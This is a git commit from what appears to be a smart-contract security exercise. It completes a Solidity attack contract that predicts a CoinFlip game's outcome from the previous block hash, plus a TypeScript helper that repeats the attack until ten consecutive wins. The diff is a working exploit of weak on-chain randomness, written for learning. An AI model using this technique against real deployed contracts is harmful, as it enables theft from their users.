be7e9d2f76cb98d9a4272011cbc21e8d1353791d
Poof Young <poof@coding4kicks.com>
2022-04-01 18:06:19 -0700

    Level 1 Complete

--- contracts/1. CoinFlip/AttackingCoinFlip.sol
+++ contracts/1. CoinFlip/AttackingCoinFlip.sol
@@ -11,5 +11,11 @@ contract AttackingCoinFlip {
 
     function hackContract() external {
         // Code me!
+        CoinFlip coinFlip = CoinFlip(contractAddress);
+        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 _coinFlip = blockValue / FACTOR;
+        bool _guess = _coinFlip == 1 ? true : false;
+        coinFlip.flip(_guess);
     }
 }
--- contracts/1. CoinFlip/CoinFlipHelper.ts
+++ contracts/1. CoinFlip/CoinFlipHelper.ts
@@ -3,6 +3,12 @@ import { ethers } from "hardhat";
 
 const helper = async (victim: any, attacker: any) => {
   // add code here that will help you pass the test
+  let consecutiveWins = await victim.consecutiveWins();
+  while (consecutiveWins < 10) {
+    const txn = await attacker.hackContract();
+    txn.wait();
+    consecutiveWins = await victim.consecutiveWins();
+  }
 };
 
 export default helper;
